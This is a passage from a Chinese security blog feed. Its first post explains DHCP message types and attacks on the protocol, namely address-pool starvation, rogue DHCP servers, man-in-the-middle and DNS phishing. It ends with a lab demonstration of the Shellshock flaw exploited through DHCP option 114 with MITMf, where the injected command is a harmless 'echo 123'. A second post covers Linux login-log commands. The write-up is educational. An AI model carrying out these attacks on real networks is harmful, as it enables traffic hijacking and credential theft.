<td style="text-align:left">options</td>
<td style="text-align:left">可选</td>
<td style="text-align:left">可选参数域，格式为 <code>代码+长度+数据</code></td>
</tr>
</tbody>
</table>
<p>关于 <code>options</code> 字段的具体说明，可以参考： <a href="http://tools.ietf.org/html/rfc2132" target="_blank" rel="external">http://tools.ietf.org/html/rfc2132</a></p>
<h4 id="1-2-2-报文类型"><a href="#1-2-2-报文类型" class="headerlink" title="1.2.2 报文类型"></a>1.2.2 报文类型</h4><p>DHCP 报文共有 <strong><code>8</code></strong> 种，分别用于不同的功能，详解如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">报文类型</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">DHCPDISCOVER</td>
<td style="text-align:left">DHCP 客户端请求地址时，并不知道 DHCP 服务器的位置，因此 DHCP 客户端会在本地网络内以广播方式发送请求报文，这个报文成为 Discover 报文，目的是发现网络中的 DHCP 服务器，所有收到 Discover 报文的 DHCP 服务器都会发送回应报文，DHCP 客户端据此可以知道网络中存在的 DHCP 服务器的位置。</td>
</tr>
<tr>
<td style="text-align:left">DHCPOFFER</td>
<td style="text-align:left">DHCP 服务器收到 Discover 报文后，就会在所配置的地址池中查找一个合适的 IP 地址，加上相应的租约期限和其他配置信息（如网关、DNS 服务器等），构造一个 Offer 报文，发送给用户，告知用户本服务器可以为其提供 IP 地址。（ 只是告诉 Client可以提供，是预分配，还需要 Client 通过 ARP 协议检测该 IP 是否重复）</td>
</tr>
<tr>
<td style="text-align:left">DHCPREQUEST</td>
<td style="text-align:left">客户端发给服务端，用来(1)从众多服务器的 <code>DHCPOFFER</code> 报文中选取一个最先接收到的，摒弃其他的 DHCP 服务器；(2)系统重启后确认之前分配的 IP 是否可用；(3)租期续约（在地址使用租期过去1/2时，会向DHCP服务器发送单播Request报文续延租期，如果没有收到DHCP ACK报文，在租期过去3/4时，发送广播Request报文续延租期。）</td>
</tr>
<tr>
<td style="text-align:left">DHCPACK</td>
<td style="text-align:left">服务端发给客户端，服务端根据收到的 Request 报文中携带的用户 MAC 地址来查找有没有相应的租约记录，如果有则发送     <code>DHCPACK</code>     报文作为回应，通知用户可以使用分配的 IP 地址</td>
</tr>
<tr>
<td style="text-align:left">DHCPNAK</td>
<td style="text-align:left">DHCP 服务器收到 <code>Request</code> 报文后，没有发现有相应的租约记录或者由于某些原因（租约到期、客户端移动到别的字网）法正常分配 IP 地址，则发送 <code>NAK</code> 报文作为回应，通知用户无法分配合适的 IP 地址</td>
</tr>
<tr>
<td style="text-align:left">DHCPDECLINE</td>
<td style="text-align:left">DHCP 客户端收到 DHCP 服务器回应的 <code>DHCPACK</code> 报文后，通过地址冲突检测发现服务器分配的地址冲突或者由于其他原因导致不能使用，则发送 <code>Decline</code> 报文，通知服务器所分配的 IP 地址不可用</td>
</tr>
<tr>
<td style="text-align:left">DHCPRELEASE</td>
<td style="text-align:left">当用户不再需要使用已分配的 IP 地址时，就会主动向 DHCP 服务器发送 <code>Release</code> 报文，告知服务器用户不再需要分配 IP 地址，DHCP 服务器会释放被绑定的租约</td>
</tr>
<tr>
<td style="text-align:left">DHCPINFORM</td>
<td style="text-align:left">DHCP 客户端如果需要从 DHCP 服务器端获取更为详细的配置信息，则发送 <code>Inform</code> 报文向服务器进行请求，服务器收到该报文后，将根据租约进行查找，找到相应的配置信息后，发送 <code>DHCPACK</code> 报文回应 DHCP 客户端</td>
</tr>
</tbody>
</table>
<h4 id="1-2-3-DHCP报文交换过程"><a href="#1-2-3-DHCP报文交换过程" class="headerlink" title="1.2.3 DHCP报文交换过程"></a>1.2.3 DHCP报文交换过程</h4><p>主要有两种流程：</p>
<ol>
<li>客户端请求新分配一个 IP 地址；</li>
<li>客户端请求续租当前已有的 IP 地址。</li>
</ol>
<p>客户端请求分配一个新的 IP 地址：</p>
<p><img src="/imgs/1425980484773.png" alt="Alt text"></p>
<p>客户端请求续租当前已有的 IP 地址：</p>
<p><img src="/imgs/1425980550504.png" alt="Alt text"></p>
<blockquote>
<p><strong>NOTE</strong>:<br>要看懂上面的数据包时序图，需要先理解前面表格中介绍过的 DHCP 8 种报文类型里的关键几种。<br>客户端在发送 <code>DHCPDISCOVER</code> 或 <code>DHCPREQUEST</code> 报文时，可以指定发给某个 DHCP 服务器，也可以不指定 DHCP 服务器而进行广播，这两种情况下客户端与服务端数据交互的细节不完全相同。<br>更多细节可参考 RFC2131。</p>
</blockquote>
<h2 id="2-协议缺陷"><a href="#2-协议缺陷" class="headerlink" title="2. 协议缺陷"></a>2. 协议缺陷</h2><p>上面两个时序图，是比较复杂的完整情况，而通常的 DHCP 交互过程可以简化成以下几个关键步骤（也是最容易出问题的几个步骤）：</p>
<ol>
<li>客户端发出一个 <code>DHCPDISCOVER</code> 报文（广播），表明想从一个 DHCP 服务器那里分配到一个 IP 地址；客户端可能会指定想租用一个以前被分配过的 IP 地址，此时会有遭受 “中间人攻击” 的危险（后文详解）；</li>
<li>接收到客户端 <code>DHCPDISCOVER</code>报文的 DHCP 服务器，会发送一个 <code>DHCPOFEER</code> 报文，告诉客户端一个成功分配的 IP 地址，但这个地址不一定是客户端指定想要的那个 IP 地址，这取决于 DHCP 服务器的 IP 地址池中的已分配情况；如果服务端 IP 地址池中有客户端指定想要的 IP 地址，那么 DHCP 服务器就会把这个 IP 地址分配给客户端；如果 DHCP 服务器的 IP 地址池中没有客户端指定想要的 IP 地址，但有其他可用的 IP 地址，则会把其他的 IP 地址分配给客户端；如果 DHCP 服务器的 IP 地址池中已经没有可用的IP 地址，则会返回一个 <code>DHCPNAK</code> 报文；</li>
<li>客户端接收到 DHCP 服务端发送的  <code>DHCPOFEER</code> 报文以后，会发送一个 <code>DHCPREQUEST</code> 报文给服务端，告知服务端即将租用这个分配来的 IP 地址；</li>
<li>DHCP 服务端接收到 客户端的 <code>DHCPREQUEST</code> 报文后，会发送一个 <code>DHCPACK</code> 报文给客户端，告知客户端可以使用了，并在服务端将客户端的 MAC 地址 和 IP 地址绑定，在 IP 地址池中做标记该 IP 地址已分配出去。</li>
</ol>
<h3 id="2-1-拒绝服务"><a href="#2-1-拒绝服务" class="headerlink" title="2.1 拒绝服务"></a>2.1 拒绝服务</h3><p>伪造一批 DHCP 客户端（手动构造 MAC 地址），通过上面的 DHCP 客户端&lt;—-&gt;DHCP服务端之间的数据包交互流程，向当前网络中的 DHCP 服务器申请大量 IP 地址，耗尽 DHCP 服务器中的可用 IP 地址池。这样会造成以下 <strong>拒绝服务</strong> 的效果：</p>
<ul>
<li>DHCP 服务器中 IP 池已耗尽，所有的 IP 地址都分配给攻击发生<strong>之前已上线</strong> 的 <strong>正常主机</strong>、和攻击所伪造的<strong>虚假主机</strong>；</li>
<li>由于 DHCP 服务器已经没能力再分配新的 IP 地址，所以该网络中的其他 <strong>刚上线</strong> 的<strong>正常主机</strong>无法获得可用 IP 地址；</li>
<li>此攻击发生 <strong>之前已经上线</strong> 的 <strong>正常主机</strong> 无法觉察 到攻击已发生；</li>
</ul>
<p>这种方式实现的 <strong>拒绝服务攻击</strong> 有个小问题：某些 DHCP 服务器会通过 <strong>ARP 请求</strong> 数据包或 <strong>ICMP Ping</strong> 数据包探测那些已分配的 IP 地址存活情况，如果探测到某个 IP 地址无响应，则会自动回收该 IP（通常情况 DHCP 客户端那一方，如果机器不关机，不会自动释放当前的 IP 地址）。而我们也有应对方式：加大伪造 DHCP 客户端申请新的 IP 地址的频率，这个频率远高于 DHCP 服务器探测未存活 IP 并将其回收的频率，从而保证只要 DHCP 服务器可以分配 IP 地址，就通过伪造的DHCP 数据包交互将可用的 IP 地址占用。（已有 POC 能应对 DHCP 服务器 <strong>ARP 请求</strong> 形式的探测， <strong>ICMP Ping</strong> 方式未测试）。</p>
<h3 id="2-2-伪造恶意的-DHCP-服务"><a href="#2-2-伪造恶意的-DHCP-服务" class="headerlink" title="2.2 伪造恶意的 DHCP 服务"></a>2.2 伪造恶意的 DHCP 服务</h3><p>黑客可以通过伪造一个 DHCP 服务器在当前网络下进行一些对 DHCP 客户端的欺骗攻击。DHCP 报文中的 <strong><code>options</code></strong> 字段可以由 DHCP Server 向 DHCP Client 指定可用的 <strong>网关</strong> 和 <strong>DNS 服务器地址</strong> ，这样一来，黑客伪造的 DHCP Server 就可以通过构造的 DHCP 数据包向客户端指定恶意的网关或 DNS 服务器地址，从而进一步实施<strong>中间人攻击</strong>。</p>
<h3 id="2-3-中间人攻击"><a href="#2-3-中间人攻击" class="headerlink" title="2.3 中间人攻击"></a>2.3 中间人攻击</h3><h4 id="2-3-1-原理"><a href="#2-3-1-原理" class="headerlink" title="2.3.1 原理"></a>2.3.1 原理</h4><p>上面 <strong>伪造恶意的 DHCP 服务</strong> 是 <strong>中间人攻击</strong> 的关键步骤，<strong>中间人攻击</strong> 最常用的方式是伪造一个 <strong>恶意网关</strong>，将受害者的网络流量都劫持到恶意网关那里，然后可以对流量进行嗅探、修改，从而使操控受害者——当然，前提是伪造的恶意网关必须有数据包转发功能。</p>
<p>按照 DHCP 协议规范，在 DHCP 客户端发出 <code>DHCPDISCOVER</code> 的广播数据包之后，如果本地网络存在多个 DHCP 服务器并且收到客户端的数据包之后各自都回应了 <code>DHCPOFFER</code> 数据包，DHCP 客户端会收到多个 <code>DHCPOFFER</code> 数据包，通常只会选择收到的第一个 <code>DHCPOFFER</code> 数据包。这样一来，其实多个 DHCP 服务器之间存在一个 <strong>竞争关系</strong>，哪一台DHCP服务器响应客户端的速度快、频率高，那么成功接管 DHCP 客户端的可能性就会越大。</p>
<p>在 DHCP 中间人攻击的过程中，恶意的 DHCP 服务器可以专门针对一个 DHCP 客户端进行攻击，一旦收到一个 DHCP 客户端发来的 <code>DHCPDISCOVER</code> 广播包，恶意 DHCP 服务器和真实 DHCP 服务器都会同时响应一个 <code>DHCPOFFER</code>包，只要 恶意 DHCP 服务器的数据包先于真实 DHCP 服务器的数据包到达客户端，恶意 DHCP 服务器就会被客户端选用，中间人攻击的第一步就会成功，否则整个中间人攻击就会失败。</p>
<h4 id="2-3-2-问题"><a href="#2-3-2-问题" class="headerlink" title="2.3.2 问题"></a>2.3.2 问题</h4><p>关于 <strong>DHCP 中间人攻击</strong> 一个明显的问题是，这种攻击在一个小型网络里面很难实施。</p>
<ul>
<li>如果客户端的网卡填充了以前曾用过但当前被回收了的IP，那么中间人攻击将很可能无法实施；</li>
<li>如果客户端的网卡填充了指定想要的某个 IP 地址（上面的曾经用过的旧 IP），而真实的 DHCP 服务器恰好分配了这个指定的 IP 地址给客户端，那么客户端将采用这个指定想要的 IP 地址，而忽略恶意 DHCP 服务器的响应；</li>
<li>唯一可能成功的，是客户端指定想要的这个 IP 地址，真实的 DHCP 服务器无法分配——可能已经分配跟网内的正常主机，也可能被恶意的 DHCP 服务主机用前面说过的 <strong>拒绝服务</strong> 攻击给恶意占用，而恶意 DHCP 服务器的 IP 池则是这些被自己恶意占用的 IP地址（恶意DHCP服务器不能随便伪造一个 IP 地址分配给受害 DHCP 客户端，那样可能造成网段内的 IP 地址冲突）——这时，恶意 DHCP 服务器才有机会成功接管受害主机的 DHCP 服务。</li>
</ul>
<p><strong>DHCP 中间人攻击</strong> 的另一个问题出在攻击的第二阶段——流量劫持。一旦第一阶段成功将受害主机的流量骗到恶意网关，下一步就是具体的流量劫持。流量劫持的完美实施，不仅需要欺骗受害主机、让受害主机把恶意网关误以为真实网关，还要欺骗真实网关、让真实网关把恶意网关误以为受害主机，这样才能完全接管受害主机出、入的双向流量。所以，一个完整的 DHCP 中间人攻击，还需要借助 <strong>ARP欺骗</strong>。</p>
<h3 id="2-4-伪造-DNS-服务"><a href="#2-4-伪造-DNS-服务" class="headerlink" title="2.4 伪造 DNS 服务"></a>2.4 伪造 DNS 服务</h3><p>前面说过，DHCP 服务器可以通过数据包向 DHCP 客户端指定一个 DNS 服务器地址。如果上面的 DHCP 服务欺骗成功，则恶意 DHCP 服务器可以通过这种方式，来对 受害主机进行 <strong>钓鱼攻击</strong>：将某个或某些受害主机用户经常上的网站的域名解析到黑客自己的服务器 IP 上去，在那里用伪造的网站页面，骗取用户登录，便可轻松得到账号、密码、联系方式、身份信息等等。</p>
<h2 id="3-攻击实践"><a href="#3-攻击实践" class="headerlink" title="3. 攻击实践"></a>3. 攻击实践</h2><p>前面一小节列出了 DHCP 协议相关的多种缺陷，即可能导致用户网络被攻击的一些点，本小节做一个简单的实践来演示一下。当然不会掩饰所有的攻击方式，只演示最基础的、简单的 DHCP 服务器欺骗攻击。原理是去年爆出的 <strong><code>Bash-Shellshock</code></strong> 漏洞在 DHCP 客户端中的利用。Linux 自带 DHCP 客户端的实现中，有通过系统调用执行 Shell 命令的代码，而除了标准字段，DHCP 还提供了可选字段（识别号码），在这种情况下，一些恶意的服务器通过可选字段 <code>114</code> 发送包含恶意指令的命令，DHCP 服务端响应的数据包中包含的恶意指令如果被客户端接收，且 Bash 版本存在漏洞，那么恶意指令就会被执行。</p>
<p>这里用到的中间人攻击攻击，还是做 <strong>ARP 中间人攻击</strong> 实验时用到的中间人攻击平台 <strong><code>MITMF</code></strong>，只需在攻击机上开启 DHCP 服务欺骗的指令，等待一个 DHCP 客户端来申请 IP 地址即可：</p>
<ol>
<li>攻击机 Kali 上启动攻击平台<br><img src="/imgs/mitmf_dhcp_hij.png" alt="Alt text"></li>
</ol>
<ol>
<li>受害主机（带有 <code>Shellshock</code> 漏洞的 Ubuntu1204）重启 DHCP 客户端，申请 IP 地址<br><img src="/imgs/dhclient_victim.png" alt="Alt text"></li>
</ol>
<p>即发现受害主机的 DHCP 客户端启动时，倒数第二行打出了 <strong><code>123</code></strong> 这一串异常字符，即是恶意 DHCP 服务器的 <code>echo 123</code> 指令得到了执行。</p>
<h2 id="4-参考资料"><a href="#4-参考资料" class="headerlink" title="4. 参考资料"></a>4. 参考资料</h2><ol>
<li><a href="http://zh.wikipedia.org/zh/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%8D%8F%E8%AE%AE" target="_blank" rel="external">http://zh.wikipedia.org/zh/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%8D%8F%E8%AE%AE</a></li>
<li><a href="http://seclists.org/vuln-dev/2002/Sep/99" target="_blank" rel="external">http://seclists.org/vuln-dev/2002/Sep/99</a></li>
<li><a href="http://tools.ietf.org/html/rfc2131" target="_blank" rel="external">http://tools.ietf.org/html/rfc2131</a></li>
<li><a href="http://tools.ietf.org/html/rfc2132" target="_blank" rel="external">http://tools.ietf.org/html/rfc2132</a></li>
<li><a href="http://tools.ietf.org/html/rfc951" target="_blank" rel="external">http://tools.ietf.org/html/rfc951</a></li>
<li><a href="https://isc.sans.edu//forums/diary/Cyber+Security+Awareness+Month+Day+6+ports+6768+udp+bootp+and+dhcp/7279/" target="_blank" rel="external">https://isc.sans.edu//forums/diary/Cyber+Security+Awareness+Month+Day+6+ports+6768+udp+bootp+and+dhcp/7279/</a></li>
<li><a href="http://howdoesinternetwork.com/2011/spoofing-attack" target="_blank" rel="external">http://howdoesinternetwork.com/2011/spoofing-attack</a></li>
<li><a href="http://www.freebuf.com/tools/45796.html" target="_blank" rel="external">http://www.freebuf.com/tools/45796.html</a></li>
<li><a href="http://sign0f4.blogspot.it/2014/07/introducing-mitmf-framework-for-man-in.html" target="_blank" rel="external">http://sign0f4.blogspot.it/2014/07/introducing-mitmf-framework-for-man-in.html</a></li>
<li><a href="http://sign0f4.blogspot.it/2014/07/mitmf-update-spoof-plugin_23.html" target="_blank" rel="external">http://sign0f4.blogspot.it/2014/07/mitmf-update-spoof-plugin_23.html</a></li>
<li><a href="http://sign0f4.blogspot.it/2014/10/mitmf-update-dhcp-pwnage.html" target="_blank" rel="external">http://sign0f4.blogspot.it/2014/10/mitmf-update-dhcp-pwnage.html</a></li>
<li><a href="http://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/" target="_blank" rel="external">http://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-协议原理&quot;&gt;&lt;a href=&quot;#1-协议原理&quot; class=&quot;headerlink&quot; title=&quot;1. 协议原理&quot;&gt;&lt;/a&gt;1. 协议原理&lt;/h2&gt;&lt;h3 id=&quot;1-1-简介&quot;&gt;&lt;a href=&quot;#1-1-简介&quot; class=&quot;headerlink&quot; title=&quot;1.1 简介&quot;&gt;&lt;/a&gt;1.1 简介&lt;/h3&gt;&lt;p&gt;DHCP( Dynamic Host Configuration Protocol, 动态主机配置协议)，是一个局域网的网络协议，使用 UDP 协议工作， 主要有两个用途：给内部网络或网络服务供应商自动分配 IP 地址，给用户或者内部网络管理员作为对所有计算机作中央管理的手段，在 RFC 2131 中有详细的描述。DHCP 有3个端口，其中 UDP67 和 UDP68 为正常的 DHCP 服务端口，分别作为 DHCP Server 和 DHCP Client 的服务端口；546 号端口用于 DHCPv6 Client ，而不用于 DHCPv4，是为 DHCP Failover 服务，这是需要特别开启的服务，DHCP Failover 是用来做“双机热备”的。&lt;/p&gt;
&lt;p&gt;在 IP 网络中，每个连接 Internet 的设备都需要分配唯一的 IP 地址。DHCP 使网络管理员能从中心结点监控和分配 IP 地址。当某台计算机移到网络中的其它位置时，能自动收到新的 IP 地址，而不用在每台计算机上单独配置固定的 IP 地址。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="dhcp" scheme="http://jiayu0x.com/tags/dhcp/"/>
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="intranet" scheme="http://jiayu0x.com/tags/intranet/"/>
    
  </entry>
  
  <entry>
    <title>Linux 日志剖析</title>
    <link href="http://jiayu0x.com/2015/01/02/Linux-log-and-analysis/"/>
    <id>http://jiayu0x.com/2015/01/02/Linux-log-and-analysis/</id>
    <published>2015-01-01T16:00:00.000Z</published>
    <updated>2017-04-04T10:46:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>Linux 系统中的日志大概可以分为以下几类：</p>
<ul>
<li>用户访问日志</li>
<li>进程监控日志</li>
<li>系统与服务日志</li>
</ul>
<p>本文将对这几种日志进行详细剖析。</p>
<blockquote>
<p><strong>NOTE</strong>:<br>本文中的例子，如非特殊说明，均在 <code>CentOS7</code> 上实施。</p>
</blockquote>
<h2 id="1-用户访问日志"><a href="#1-用户访问日志" class="headerlink" title="1. 用户访问日志"></a>1. 用户访问日志</h2><p>用户的登录时间日志一般由 <code>/var/log/wtmp</code> 和 <code>/var/run/utmp</code> 这两个文件记录，不过这两个文件无法直接 <code>cat</code> 命令查看，并且该文件由系统自动更新。这两个文件中的内容可以用 <code>w/who/finger/id/last/ac/uptime</code> 这几个命令来查看。 <code>/var/log/lastlog</code> 文件记录用户最后登录的信息，可用 <code>lastlog</code> 命令来查看。</p>
<a id="more"></a>
<p>日志文件是多数重用 UNIX 日志子系统的关键——保持用户登录进入和退出的纪录。有关当前登录用户的信息记录在文件 <code>/var/run/utmp</code> 中；登录进入和退出纪录在文件 <code>/var/log/wtmp</code> 中；最后一次登录文件可以用 <code>lastlog</code> 命令察看。数据交换、关机和重起也记录在 <code>/var/log/wtmp</code> 文件中。所有的纪录都包含时间戳。这些文件（ <code>/var/log/lastlog</code> 通常不大）在具有大量用户的系统中增长十分迅速。例如wtmp文件可以无限增长，除非定期截取。许多系统以一天或者一周为单位把 <code>/var/log/wtmp</code> 配置成循环使用。它通常由 <code>cron</code> 运行的脚本来修改。这些脚本重新命名并循环使用 <code>/var/log/wtmp</code> 文件。通常， <code>/var/log/wtmp</code> 在第一天结束后命名为 <code>wtmp.1</code> ；第二天后 <code>wtmp.1</code>变为 <code>wtmp.2</code> 等等，直到 <code>wtmp.7</code>。</p>
<p>每次有一个用户登录时， <code>login</code> 程序在文件 <code>lastlog</code> 中察看用户的 <code>UID</code> 。如果找到了，则把用户上次登录、退出时间和主机名写到标准输出中，然后 <code>login</code> 程序在 <code>/var/log/lastlog</code>中纪录新的登录时间。在新的 <code>/var/log/lastlog</code> 纪录写入后， <code>/var/run/utmp</code> 文件打开并插入用户的 <code>utmp</code> 纪录。该纪录一直用到用户登录退出时删除。  <code>/var/run/utmp</code> 文件被各种命令文件使用，包括 <code>who</code> 、<code>w</code> 、<code>users</code> 和 <code>finger</code>。</p>
<p>下一步，<code>login</code> 程序打开文件 <code>/var/log/wtmp</code> 附加用户的 <code>utmp</code> 纪录。当用户登录退出时，具有更新时间戳的同一 <code>utmp</code> 纪录附加到文件中。 <code>/var/log/wtmp</code> 文件被程序 <code>last</code> 和 <code>ac</code> 使用。</p>
<hr>
<h3 id="1-1-who-命令"><a href="#1-1-who-命令" class="headerlink" title="1.1 who 命令"></a>1.1 <code>who</code> 命令</h3><p>该命令查询  <code>/var/run/utmp</code> 文件并报告 <strong>当前登录</strong> 的每个用户。<code>who</code> 的缺省输出包括 <strong>用户名</strong>、<strong>终端类型</strong>、<strong>登录日期</strong> 及 <strong>远程主机</strong>。例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜ who</div><div class="line">root     tty1         2014-12-29 16:34</div><div class="line">root     pts/0        2014-12-29 15:48 (ses-254-254.geology.ohio-state.edu)</div><div class="line">root     pts/1        2014-12-29 16:40 (ses-254-254.geology.ohio-state.edu)</div></pre></td></tr></table></figure></p>
<blockquote>
<p><strong>NOTE</strong>:<br>关于 <code>tty/pts</code> 的概念，可参考： <a href="http://7056824.blog.51cto.com/69854/276610" target="_blank" rel="external">Linux中tty、pty、pts的概念区别</a></p>
</blockquote>
<p>如果指明了 <code>wtmp</code> 的文件名，则 <code>who</code> 命令查询所有以前的纪录。命令 <code>who /var/log/wtmp</code> 将报告 <strong>自从 <code>/var/log/wtmp</code> 文件创建或删改以来的每一次登录</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜ who /var/log/wtmp</div><div class="line">root     tty1         2014-10-16 17:35</div><div class="line">root     tty1         2014-10-16 19:42</div><div class="line">root     tty1         2014-10-16 20:05</div><div class="line">root     pts/0        2014-10-17 10:56 (ses-254-254.geology.ohio-state.edu)</div><div class="line">root     pts/1        2014-10-17 13:55 (ses-254-254.geology.ohio-state.edu)</div><div class="line">root     pts/1        2014-10-17 14:00 (ses-254-254.geology.ohio-state.edu)</div><div class="line">root     pts/2        2014-10-17 14:59 (ses-254-254.geology.ohio-state.edu)</div><div class="line">root     tty1         2014-10-20 17:53</div><div class="line">......</div></pre></td></tr></table></figure></p>
<h3 id="1-2-w-命令"><a href="#1-2-w-命令" class="headerlink" title="1.2 w 命令"></a>1.2 <code>w</code> 命令</h3><p>该命令查询 <code>/var/log/wtmp</code> 文件并显示 <strong>当前</strong> 系统中每个用户和它所运行的进程信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">➜ w</div><div class="line"> 17:00:52 up 3 days,  2:16,  3 users,  load average: 0.06, 0.03, 0.05</div><div class="line">USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT</div><div class="line">root     tty1      16:34   26:12   0.11s  0.11s -zsh</div><div class="line">root     pts/0     15:48    4.00s  0.19s  0.02s w</div><div class="line">root     pts/1     16:57   20.00s  0.74s  0.08s zsh</div></pre></td></tr></table></figure></p>
<h3 id="1-3-users-命令"><a href="#1-3-users-命令" class="headerlink" title="1.3 users 命令"></a>1.3 <code>users</code> 命令</h3><p>用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名将显示相同的次数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ users</div><div class="line">root root root</div></pre></td></tr></table></figure></p>
<h3 id="1-4-id-命令"><a href="#1-4-id-命令" class="headerlink" title="1.4 id 命令"></a>1.4 <code>id</code> 命令</h3><p>与上面 <code>users</code> 命令类似，但可以显示更多信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜ id</div><div class="line">uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</div><div class="line">➜ id root</div><div class="line">uid=0(root) gid=0(root) 组=0(root)</div></pre></td></tr></table></figure></p>
<p><code>id</code> 命令可以显示用户组信息以及更为复杂的 <code>SELinux</code> 上下文信息（比如第一条命令，如果系统启用了 <code>SELinux</code> ，默认就会输出 <code>SELinux</code> 上下文信息）；第二条命令指定输出某个用户名的信息时，则会只输出用户和组信息。</p>
<h3 id="1-5-last-命令"><a href="#1-5-last-命令" class="headerlink" title="1.5 last 命令"></a>1.5 <code>last</code> 命令</h3><p>该命令往回搜索 <code>/var/log/wtmp</code> 文件来显示自从该文件第一次创建以来所有登录过的用户：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">➜ last</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:57   still logged in</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:49 - 16:57  (00:08)</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:40 - 16:47  (00:06)</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:36 - 16:40  (00:04)</div><div class="line">root     tty1                          Mon Dec 29 16:34   still logged in</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:33 - 16:33  (00:00)</div><div class="line">root     pts/0        ses-254-254.geol Mon Dec 29 15:48   still logged in</div><div class="line">root     pts/0        ses-254-254.geol Fri Dec 26 14:48 - 18:04  (03:15)</div><div class="line">reboot   system boot  3.10.0-123.13.2. Fri Dec 26 14:44 - 17:12 (3+02:27)</div><div class="line">root     pts/0        ses-254-254.geol Fri Dec 26 10:23 - down   (00:07)</div><div class="line">root     tty1                          Wed Dec 24 10:00 - down  (2+00:30)</div><div class="line">reboot   system boot  3.10.0-123.13.2. Wed Dec 24 09:58 - 10:31 (2+00:32)</div><div class="line"></div><div class="line">......</div><div class="line"></div><div class="line">wtmp begins Thu Oct 16 17:33:46 2014</div></pre></td></tr></table></figure></p>
<p><strong>如果指明了用户，则该命令只显示该用户的近期活动：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">➜ last root</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:57   still logged in</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:49 - 16:57  (00:08)</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:40 - 16:47  (00:06)</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:36 - 16:40  (00:04)</div><div class="line">root     tty1                          Mon Dec 29 16:34   still logged in</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:33 - 16:33  (00:00)</div><div class="line">root     pts/0        ses-254-254.geol Mon Dec 29 15:48   still logged in</div><div class="line">root     pts/0        ses-254-254.geol Fri Dec 26 14:48 - 18:04  (03:15)</div><div class="line">root     pts/0        ses-254-254.geol Fri Dec 26 10:23 - down   (00:07)</div><div class="line">root     tty1                          Wed Dec 24 10:00 - down  (2+00:30)</div><div class="line"></div><div class="line">......</div><div class="line"></div><div class="line">wtmp begins Thu Oct 16 17:33:46 2014</div></pre></td></tr></table></figure></p>
<h3 id="1-6-ac-命令"><a href="#1-6-ac-命令" class="headerlink" title="1.6 ac 命令"></a>1.6 <code>ac</code> 命令</h3><p>命令根据当前的 <code>/var/log/wtmp</code> 文件中的登录进入和退出来报告用户连结的时间（小时），如果不使用标志，则报告总的时间：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ ac</div><div class="line">    total      231.40</div></pre></td></tr></table></figure></p>
<p><strong><code>ac -p</code> 显示每个用户的总的连接时间：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜ ac -p</div><div class="line">    root                               231.45</div><div class="line">    total      231.45</div></pre></td></tr></table></figure></p>
